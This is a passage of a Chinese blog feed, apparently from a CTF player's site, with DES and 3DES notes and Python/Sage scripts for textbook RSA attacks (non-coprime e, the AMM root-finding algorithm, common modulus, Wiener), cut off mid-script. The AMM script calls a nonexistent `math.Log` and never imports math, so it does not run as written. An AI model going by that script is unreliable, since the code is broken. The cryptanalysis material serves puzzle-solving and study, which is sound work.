selecting:\n1、Encryption\t 2、Decrpytion\nYour selecting:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> select == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            plaintext = <span class="built_in">input</span>(<span class="string">&quot;Input plaintext：&quot;</span>)</span><br><span class="line">            <span class="comment"># print(&quot;Your plaintext is:&#123;&#125;&quot;.format(plaintext))</span></span><br><span class="line">            ciphertext = self.encode(plaintext)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The ciphertext is:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(ciphertext))</span><br><span class="line">        <span class="keyword">elif</span> select == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            plaintext = <span class="built_in">input</span>(<span class="string">&quot;Input ciphertext：&quot;</span>)</span><br><span class="line">            <span class="comment"># print(&quot;Your ciphertext is:&#123;&#125;&quot;.format(plaintext))</span></span><br><span class="line">            plaintext = self.decode(plaintext)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The plaintext is:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(plaintext))</span><br><span class="line">            <span class="comment"># print(len(plaintext))</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">input</span>(<span class="string">&quot;Please selecting again！&quot;</span>)</span><br><span class="line">            self.main()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    mydes = ArrangeSimpleDES()</span><br><span class="line">    mydes.modify_secretkey()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mydes.main()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>另外要说的是，python也有模块可以直接进行des的加解密，但是真要考DES多半不会直接用这个就能出。。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import DES</span><br><span class="line">message = b&#x27;&#x27;</span><br><span class="line">key = b&#x27;&#x27;</span><br><span class="line">cipher = DES.new(key, DES.MODE_ECB) #这里使用了ECB模式</span><br><span class="line">ciphertext = cipher.encrypt(message) #加密</span><br><span class="line">print(ciphertext)</span><br><span class="line">plain = cipher.decrypt(ciphertext) #解密</span><br><span class="line">print(plain)</span><br></pre></td></tr></table></figure><h2 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h2><p>由于DES的实际密钥长度只有56位，安全性并不高，于是便有了3DES，可以说是对明文进行了3次DES，因此密钥有168位。</p><p>流程如下（图来源<a href="https://blog.csdn.net/qq_41137136/article/details/86416849">这篇文章</a>）</p><h3 id="DES-EDE3"><a href="#DES-EDE3" class="headerlink" title="DES-EDE3"></a>DES-EDE3</h3><p>三个密钥都不同时</p><p><img src="/images/DES%E5%8A%A0%E5%AF%86/2019011314264658.png" alt="2019011314264658"></p><h3 id="DES-EDE2"><a href="#DES-EDE2" class="headerlink" title="DES-EDE2"></a>DES-EDE2</h3><p>当密钥1、3相同，密钥2不同时</p><p><img src="/images/DES%E5%8A%A0%E5%AF%86/20190113142411607.png" alt="20190113142411607"></p><p>当三个密钥都相同时，就成了普通的DES</p><h2 id="关于DES的攻击"><a href="#关于DES的攻击" class="headerlink" title="关于DES的攻击"></a>关于DES的攻击</h2><blockquote><p>这里有待补充</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HSCCTF2024 Writeup</title>
      <link href="/2024/03/10/HSCCTF2024-Writeup/"/>
      <url>/2024/03/10/HSCCTF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/HSCCTF2024Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> HSCCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学算法散记</title>
      <link href="/2024/03/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AE%97%E6%B3%95%E6%95%A3%E8%AE%B0/"/>
      <url>/2024/03/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AE%97%E6%B3%95%E6%95%A3%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在这里零散地记载一些密码学可能用到的算法脚本<del>（当裁缝）</del>，方便之后直接拿来用</p></blockquote><h2 id="RSA中的e-phi不互素问题"><a href="#RSA中的e-phi不互素问题" class="headerlink" title="RSA中的e,phi不互素问题"></a>RSA中的e,phi不互素问题</h2><p>参考了<a href="https://blog.csdn.net/m0_74345946/article/details/133936371">这篇文章</a></p><h3 id="换模"><a href="#换模" class="headerlink" title="换模"></a>换模</h3><p>当e和p-1或q-1互素时，可以转换到模p或模q下求解</p><p>假设e与p-1互素<br>$$<br>m^e\equiv c(mod\ n)<br>$$</p><p>$$<br>m^e&#x3D;c+kpq<br>$$</p><p>$$<br>m^e\ mod\ p&#x3D;c\ mod\ p+kpq\ mod\ p<br>$$</p><p>$$<br>m^e\equiv c(mod\ p)<br>$$</p><p>python实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e=</span><br><span class="line">p=</span><br><span class="line">q=</span><br><span class="line">n=</span><br><span class="line">c=</span><br><span class="line"><span class="keyword">assert</span> gmpy2.gcd(e,p-<span class="number">1</span>)==<span class="number">1</span></span><br><span class="line">c=c%p</span><br><span class="line">phi=p-<span class="number">1</span></span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,p)</span><br></pre></td></tr></table></figure><h3 id="e-gcd-iroot-m-2"><a href="#e-gcd-iroot-m-2" class="headerlink" title="e&#x2F;&#x2F;gcd iroot(m,2)"></a>e&#x2F;&#x2F;gcd iroot(m,2)</h3><p>当gcd(e,phi)较小时，可以先将e&#x2F;&#x2F;gcd(e,phi)，使得e和phi互素后，再对算出的m开根</p><p>python实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e=</span><br><span class="line">p=</span><br><span class="line">q=</span><br><span class="line">n=</span><br><span class="line">c=</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">_gcd=gmpy2.gcd(e,phi)</span><br><span class="line">e=e//_gcd</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=gmpy2.iroot(<span class="built_in">pow</span>(c,d,p),_gcd)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h3 id="有限域内开方"><a href="#有限域内开方" class="headerlink" title="有限域内开方"></a>有限域内开方</h3><p>有时，当e较小时，我们仍然无法用上面的方法得到m。这时，我们可以使用有限域内开方的方法。</p><p>前面我们已经证明了，当p为素数时，由<br>$$<br>m^e\equiv c(mod\ n)<br>$$<br>可以推知<br>$$<br>m^e\equiv c(mod\ p)<br>$$<br>于是我们可以设法找到所有满足<br>$$<br>m^e\equiv x^e\equiv c(mod\ p)<br>$$<br>的x，以及所有满足<br>$$<br>m^e\equiv y^e\equiv c(mod\ q)<br>$$<br>的y，从而列出<br>$$<br>\begin{cases}m\equiv x(mod\ p) \ m\equiv y(mod\ q)\end{cases}<br>$$<br>的方程组，通过中国剩余定理（CRT）求解。</p><p>下面是一个利用sagemath的程序实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">c = </span><br><span class="line">e = </span><br><span class="line">n = </span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">f=a^e-c</span><br><span class="line">mps=f.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(q),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">g=a^e-c</span><br><span class="line">mqs=g.monic().roots()</span><br><span class="line"></span><br><span class="line">flag=[]</span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    x=mpp[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        y=mqq[<span class="number">0</span>]</span><br><span class="line">        solution = CRT_list([<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)], [p, q])</span><br><span class="line">        flag.append(solution)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    m=long_to_bytes(i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span><span class="keyword">in</span> m:</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当然也可以通过观察对算法进行一定的优化，详见上面给出的文章，这里不再赘述。</p><h3 id="AMM算法"><a href="#AMM算法" class="headerlink" title="AMM算法"></a>AMM算法</h3><p>参考了<a href="https://lov2.netlify.app/rsa_e_phi_not_coprime/">这篇文章</a></p><p>当e比较大的时候，我们可以使用AMM算法，它能够大大提高运算的速度</p><h4 id="原算法"><a href="#原算法" class="headerlink" title="原算法"></a>原算法</h4><p>先说明一下AMM算法的原算法，此时e&#x3D;2，p为奇素数，对于<br>$$<br>x^2\equiv r(mod\ p)<br>$$<br>我们先对两边开根<br>$$<br>x\equiv r^{\frac{1}{2}}(mod\ p)<br>$$<br>令p-1&#x3D;2^{s}t，又由欧拉定理得，<br>$$<br>r^{\frac{p-1}{2}}\equiv r^{2^{s-1}t}\equiv 1(mod\ p)<br>$$</p><h5 id="当s-1时，"><a href="#当s-1时，" class="headerlink" title="当s&#x3D;1时，"></a>当s&#x3D;1时，</h5><p>$$<br>r^t\equiv 1(mod\ p)<br>$$</p><p>两边同时乘r，再开根，即推出公式<br>$$<br>r^{\frac{t+1}{2}}\equiv \pm \sqrt r\equiv \pm x(mod\ p)<br>$$<br>将m和c代进去，就是这样(t可以根据p算出来)<br>$$<br>\pm m\equiv c^{\frac{t+1}{2}}<br>$$</p><h5 id="当s-1时，-1"><a href="#当s-1时，-1" class="headerlink" title="当s&gt;1时，"></a>当s&gt;1时，</h5><p>如果直接开根我们会得到一正一负两个式子<br>$$<br>r^{2^{s-2}t}\equiv 1(mod\ p)<br>$$</p><p>$$<br>r^{2^{s-2}t}\equiv -1(mod\ p)<br>$$</p><p>由上面得到的<br>$$<br>r^{2^{s-1}t}\equiv 1(mod\ p)<br>$$<br>两边同时乘上这个式子，并用k来控制是否要乘（k&#x3D;0,1）<br>$$<br>r^{2^{s-2}t}n^{2^{s-1}tk}\equiv 1(mod\ p)<br>$$<br>就这样反复对两边进行开方操作，直至回到前面s&#x3D;1的情况，即<br>$$<br>r^tn^{t*(2k_1+2^2k_2+…+2^{s-1}k_{s-1})}\equiv 1(mod\ p)<br>$$<br>两边乘上r再开方<br>$$<br>r^{\frac{t+1}{2}}n^{t*(k_1+2k_2+…+2^{s-2}k_{s-1})}\equiv\pm  \sqrt r\equiv \pm x(mod\ p)<br>$$<br>将m和c代进去，得到<br>$$<br>c^{\frac{t+1}{2}}n^{t*(k_1+2k_2+…+2^{s-2}k_{s-1})}\equiv \pm m(mod\ p)<br>$$</p><h4 id="e-2"><a href="#e-2" class="headerlink" title="e&gt;2"></a>e&gt;2</h4><p>对于<br>$$<br>x^e\equiv r(mod\ p)<br>$$<br>令p-1&#x3D;e^{s}t，则有<br>$$<br>r^{\frac{p-1}{e}}\equiv r^{e^{s-1}t}\equiv 1(mod\ p)<br>$$<br>此时可以找到δ，使得t|(eδ-1)，则<br>$$<br>r^{e^{s-1}(eδ-1)}\equiv 1(mod\ p)<br>$$</p><h5 id="当s-1时，-2"><a href="#当s-1时，-2" class="headerlink" title="当s&#x3D;1时，"></a>当s&#x3D;1时，</h5><p>$$<br>r^{(eδ-1)}\equiv 1(mod\ p)<br>$$</p><p>两边乘r，再开e次方<br>$$<br>r^\delta\equiv r^{\frac{1}{e}}\equiv x(mod\ p)<br>$$</p><h5 id="当s-1时，-3"><a href="#当s-1时，-3" class="headerlink" title="当s&gt;1时，"></a>当s&gt;1时，</h5><p>构造e次非剩余集合<br>$$<br>K_i&#x3D;\rho^{i<em>\frac{p-1}{e}}&#x3D;\rho^{i</em>e^{s-1}t},0\leq i\leq e-1<br>$$</p><p>$$<br>K_i^e&#x3D;\rho^{i<em>e^st}&#x3D;\rho^{i</em>(p-1)}<br>$$</p><p>所以根据欧拉定理，得<br>$$<br>\rho^{i*(p-1)}\equiv \rho^{(p-1)}\equiv1(mod\ p)<br>$$<br>由上面的式子又可以推知<br>$$<br>\begin{cases}K_i&#x3D;\rho^{\frac{i*(p-1)}{e}} \ K_{e-i}&#x3D;\rho^{\frac{(e-i)*(p-1)}{e}}\end{cases}<br>$$</p><p>$$<br>K_i<em>K_{e-i}&#x3D;\rho^{p-1}<br>$$<br>由欧拉定理又可以得到<br>$$<br>K_i</em>K_{e-i}\equiv 1(mod\ p)<br>$$<br>所以K_i和K_{e-i}互为逆元</p><p>对于前面这个式子<br>$$<br>r^{e^{s-1}(eδ-1)}\equiv 1(mod\ p)<br>$$<br>两边开e次方得到一个集合K中的数设为K_{e-j}<br>$$<br>r^{e^{s-2}(eδ-1)}\equiv K_{e-j}(mod\ p)<br>$$<br>两边乘上K_j然后开e次方<br>$$<br>r^{e^{s-2}(eδ-1)}K_j\equiv K_{e-j}K_j\equiv 1(mod\ p)<br>$$</p><p>$$<br>r^{e^{s-2}(eδ-1)}\rho^{j*e^{s-1}t}\equiv 1(mod\ p)<br>$$</p><p>反复进行上述操作，直至回到s&#x3D;1的情况<br>$$<br>r^{(eδ-1)}\rho^{ej_1+e^2j_2+…+e^{s-1}j_{s-1}}\equiv 1(mod\ p)<br>$$<br>两边乘r，开e次方<br>$$<br>r^δ\rho^{j_1+ej_2+…+e^{s-2}j_{s-1}}\equiv r^{\frac{1}{e}}\equiv x(mod\ p)<br>$$<br>将m和c代进去，得到<br>$$<br>c^δ\rho^{j_1+ej_2+…+e^{s-2}j_{s-1}}\equiv m(mod\ p)<br>$$<br>此时我们便得到了其中一个根，剩余的根可以通过不断乘上集合K得到.</p><p>当我们得到了所有的解以后，使用中国剩余定理对下面的方程组求解即可<br>$$<br>\begin{cases} m^e\equiv cp(mod\ p) \ m^e\equiv cq(mod\ q)\end{cases}<br>$$<br>python代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * <span class="comment"># pip install pycryptodome</span></span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="comment"># pip install gmpy2</span></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm <span class="comment"># pip install tqdm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">onemod</span>(<span class="params">e, q</span>):</span><br><span class="line">    p = random.randint(<span class="number">1</span>, q - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> ((gmpy2.powmod(p, (q - <span class="number">1</span>) // e, q)) == <span class="number">1</span>):</span><br><span class="line">        p = random.randint(<span class="number">1</span>, q)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM_rth</span>(<span class="params">x, e, N</span>):</span><br><span class="line">    <span class="keyword">assert</span> ((N - <span class="number">1</span>) % e == <span class="number">0</span>)</span><br><span class="line">    p = onemod(e, N)</span><br><span class="line">    </span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = N - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (s % e == <span class="number">0</span>):</span><br><span class="line">        s = s // e</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> ((s * k + <span class="number">1</span>) % e != <span class="number">0</span>):</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    delta = (s * k + <span class="number">1</span>) // e</span><br><span class="line"></span><br><span class="line">    a = gmpy2.powmod(p, e ** (t - <span class="number">1</span>) * s, N)</span><br><span class="line">    b = gmpy2.powmod(x, e * delta - <span class="number">1</span>, N)</span><br><span class="line">    c = gmpy2.powmod(p, s ,N)</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">1</span>, t)):</span><br><span class="line">        d = gmpy2.powmod(b, e ** (t - <span class="number">1</span> -i), N)</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = (- math.Log(d, a)) % e</span><br><span class="line">        b = b * (c ** (e ** j)) % N</span><br><span class="line">        h = h * (c ** j) % N</span><br><span class="line">        c = c ** e % N</span><br><span class="line">    result = gmpy2.powmod(x, delta, N) * h</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ALL_ROOT2</span>(<span class="params">r, q</span>):  </span><br><span class="line">    list1 = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(list1) &lt; r):</span><br><span class="line">        p = gmpy2.powmod(random.randint(<span class="number">1</span>, q - <span class="number">1</span>), (q - <span class="number">1</span>) // r, q)</span><br><span class="line">        list1.add(p)</span><br><span class="line">    <span class="keyword">return</span> list1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ALL_Solution</span>(<span class="params">m, q, rt, cq, e</span>):</span><br><span class="line">    mp = []</span><br><span class="line">    <span class="keyword">for</span> pr <span class="keyword">in</span> rt:</span><br><span class="line">        r = (pr * m) % q</span><br><span class="line">        mp.append(r)</span><br><span class="line">    <span class="keyword">return</span> mp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">mp, mq, e, p, q</span>):</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    t1 = gmpy2.invert(q, p)</span><br><span class="line">    t2 = gmpy2.invert(p, q)</span><br><span class="line">    <span class="keyword">for</span> mp1 <span class="keyword">in</span> mp:</span><br><span class="line">        <span class="keyword">for</span> mq1 <span class="keyword">in</span> mq:</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> j % <span class="number">100000</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(j)</span><br><span class="line">            ans = (mp1 * t1 * q + mq1 * t2 * p) % (p * q)</span><br><span class="line">            <span class="keyword">if</span> check(ans):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">if</span> flag_info <span class="keyword">in</span> a:</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">e = </span><br><span class="line">flag_info = <span class="string">b&#x27;flag&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line">cp = c % p</span><br><span class="line">cq = c % q</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;start&quot;</span>)</span><br><span class="line"></span><br><span class="line">mp = AMM_rth(cp, e, p)</span><br><span class="line">mq = AMM_rth(cq, e, q)</span><br><span class="line"></span><br><span class="line">rt1 = ALL_ROOT2(e, p)  </span><br><span class="line">rt2 = ALL_ROOT2(e, q)</span><br><span class="line"></span><br><span class="line">amp = ALL_Solution(mp, p, rt1, cp, e)  </span><br><span class="line">amq = ALL_Solution(mq, q, rt2, cq, e)</span><br><span class="line"></span><br><span class="line">calc(amp, amq, e, p, q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;run over&quot;</span>)</span><br></pre></td></tr></table></figure><p>当然，这里还得介绍一下sagemath中有一个很好用的方法.nth_root，可以非常有效地完成域下的高次开根</p><p>大概用法如下，可视情况做出修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">K=Zmod(n)</span><br><span class="line">x=K(c).nth_root(e,<span class="built_in">all</span>=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>这样可以返回所有在模n整数环下，满足x^e ≡ c (mod n)的x</p><h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h2><p>用于解决在GF(n)下，明文相同，公钥不同，而模n又很大难以分解的情况（两组公钥和密文已知）<br>$$<br>\begin{cases}m^{e_1}\equiv c_1(mod\ n) \ m^{e_2}\equiv c_2(mod\ n)\end{cases}<br>$$<br>两边分别同时乘s1,s2次方<br>$$<br>\begin{cases}m^{e_1s_1}\equiv c_1^{s_1}(mod\ n) \ m^{e_2s_2}\equiv c_2^{s_2}(mod\ n)\end{cases}<br>$$<br>两式相乘<br>$$<br>m^{e_1s_1+e_2s_2}\equiv c_1^{s_1}c_2^{s_2}(mod\ n)<br>$$<br>这里使用扩展欧几里得算法，我们可以找到能满足e1s1+e2s2&#x3D;1的s1和s2。又因为一般来说m&lt;n，所以<br>$$<br>m&#x3D;c_1^{s_1}c_2^{s_2}\ mod\ n<br>$$<br>代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=</span><br><span class="line">e1=</span><br><span class="line">e2=</span><br><span class="line">c1=</span><br><span class="line">c2=</span><br><span class="line">_gcd,s1,s2=gmpy2.gcdext(e1,e2)</span><br><span class="line">m=<span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n)%n</span><br></pre></td></tr></table></figure><h2 id="维纳攻击"><a href="#维纳攻击" class="headerlink" title="维纳攻击"></a>维纳攻击</h2><p>参考<a href="https://blog.csdn.net/XiongSiqi_blog/article/details/130515028">这篇文章</a></p><p>用于RSA中e很大的时候</p><p>代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continuedFra</span>(<span class="params">x, y</span>):</span><br><span class="line">    cf = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cf.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> cf</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    numerator = <span class="number">0</span></span><br><span class="line">    denominator = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cf[::-<span class="number">1</span>]:</span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    <span class="keyword">return</span> numerator, denominator</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pq</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    par = gmpy2.isqrt(b * b - <span class="number">4</span> * a * c)</span><br><span class="line">    <span class="keyword">return</span> (-b + par) // (<span class="number">2</span> * a), (-b - par) // (<span class="number">2</span> * a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getGradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    gf = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(cf) + <span class="number">1</span>):</span><br><span class="line">        gf.append(gradualFra(cf[:i]))</span><br><span class="line">    <span class="keyword">return</span> gf</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    cf = continuedFra(e, n)</span><br><span class="line">    gf = getGradualFra(cf)</span><br><span class="line">    <span class="keyword">for</span> d, k <span 